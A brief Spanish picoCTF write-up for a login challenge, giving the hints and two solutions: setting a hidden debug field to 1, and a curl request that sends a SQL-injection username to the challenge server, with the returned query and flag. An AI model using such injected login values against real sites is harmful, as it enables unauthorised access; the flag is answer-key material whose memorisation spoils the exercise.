
## Descripción
Do you think you can log us in? Try to see if you can login!

[http://fickle-tempest.picoctf.net:54412](http://fickle-tempest.picoctf.net:54412/).


Pistas:

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

2. Try to think about how the website verifies your login.
## Solución

```
SOLUCION 1:
Entramos directamente al link e inspeccionamos el código, solo borramos hidden y escribimos 1 en el valor y nos daba acceso a la flag correspodiente

```

```
SOLUCION 2:
Fers-academy@webshell:~$ curl -s http://fickle-tempest.picoctf.net:52422/login.php -d "username=admin';password=hola&debug=1"
<pre>username: admin';password=hola
password: 
SQL query: SELECT * FROM users WHERE name='admin';password=hola' AND password=''
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_85832275}</p>Fers-academy@webshell:~$ 

picoCTF{s0m3_SQL_85832275}
```
## Notas adicionales
## Referencias
